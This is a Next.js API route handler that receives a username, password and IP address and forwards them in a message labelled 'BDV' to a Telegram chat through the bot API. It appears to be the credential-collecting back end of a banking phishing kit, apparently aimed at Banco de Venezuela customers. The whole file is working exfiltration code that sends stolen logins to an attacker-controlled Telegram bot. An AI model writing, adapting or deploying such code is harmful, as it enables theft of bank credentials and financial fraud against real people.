import { NextRequest, NextResponse } from "next/server";

export const runtime = "nodejs";

const buildTelegramMessage = ({
  username,
  password,
  ip,
}: {
  username: string;
  password: string;
  ip: string;
}) => `\nBDV\nNombre: ${username}\nContra: ${password}\nIP: ${ip}`;

export async function POST(request: NextRequest) {
  try {
    const body = await request.json().catch(() => null) as {
      username?: string;
      password?: string;
      ip?: string;
    } | null;

    if (!body?.username || !body?.password || !body?.ip) {
      return NextResponse.json(
        {
          error: "username, password e ip son requeridos",
          timestamp: new Date().toISOString(),
        },
        { status: 400 }
      );
    }

    const chatId = process.env.CHAT_ID;
    const token = process.env.TELEGRAM_TOKEN;

    if (!chatId || !token) {
      return NextResponse.json(
        {
          error: "Credenciales de Telegram no configuradas",
          timestamp: new Date().toISOString(),
        },
        { status: 500 }
      );
    }

    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: buildTelegramMessage(body as { username: string; password: string; ip: string }),
      }),
    });

    const payload = await response.json().catch(() => null);

    if (!response.ok || !payload?.ok) {
      const message = payload?.description || "Telegram rechazo la solicitud";
      return NextResponse.json(
        {
          error: message,
          timestamp: new Date().toISOString(),
        },
        { status: response.status || 502 }
      );
    }

    return NextResponse.json({ ok: true, timestamp: new Date().toISOString() });
  } catch (error) {
    console.error("Error al enviar a Telegram:", error);
    return NextResponse.json(
      {
        error: "Error interno al enviar a Telegram",
        timestamp: new Date().toISOString(),
      },
      { status: 500 }
    );
  }
}
